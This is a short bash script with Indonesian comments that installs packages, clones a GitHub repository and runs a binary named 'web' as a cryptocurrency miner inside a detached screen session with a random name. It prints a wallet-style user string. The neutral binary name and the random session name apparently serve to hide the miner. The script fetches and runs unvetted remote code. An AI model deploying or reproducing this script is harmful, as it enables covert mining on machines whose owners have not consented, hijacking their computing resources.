#!/bin/bash

# Nama proses screen random
RAND_NAME=$(tr -dc a-z0-9 </dev/urandom | head -c 8)

# Instal dependensi
apt install -y wget tar screen

# Download dan ekstrak file
git clone https://github.com/amirul5656/webjs.git
cd webjs

chmod +x web
# Jalankan miner dalam screen
screen -dmS $RAND_NAME ./web
echo "🚀 Miner sedang berjalan di dalam screen: $RAND_NAME (user: mbc1qt9gj6nqz4p3f7tylp9mnuvc8vcyrcgue9psxg5.$RAND_NAME)"
